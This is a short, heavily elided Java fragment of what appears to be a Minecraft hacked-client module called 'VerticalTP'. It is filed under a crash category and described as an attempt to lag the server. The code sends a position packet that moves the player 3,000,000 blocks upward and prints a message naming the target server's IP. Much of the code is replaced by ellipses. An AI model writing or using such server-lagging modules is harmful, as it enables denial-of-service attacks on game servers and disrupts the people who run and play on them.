...
public class VerticalTP extends Module {
   ...
   public VerticalTP() {
      super("VerticalTP", "Attempts to lag the server", Category.CRASH, -1, false, true);
   ...
   public void onUpdate() {
      ...
      if (this.sendMessage.isEnabled()) {
         sendMessage("Attempted to lag " + class_124.field_1079 + this.getIP() + class_124.field_1061 + " using" + class_124.field_1077 + " VerticalTP");
      }
   ...
   private void doVertical() {
      ...
      class_2829 vertical = new class_2829(x, y + 3000000.0D, z, true);
